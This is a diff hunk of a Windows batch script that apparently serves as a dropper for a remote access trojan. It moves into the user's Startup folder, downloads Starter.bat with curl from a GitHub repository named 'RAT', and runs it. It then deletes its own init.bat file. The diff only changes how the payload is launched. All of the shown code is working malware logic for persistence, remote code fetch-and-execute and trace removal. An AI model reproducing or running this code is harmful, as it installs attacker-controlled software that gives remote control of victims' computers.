@@ -4,6 +4,6 @@ set "currentd=%cd%"
 set "targetd=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 cd %targetd%
 powershell powershell.exe "curl https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat"
-powershell ./Starter.bat
+cmd /c Starter.bat
 cd %currentd%
 del init.bat
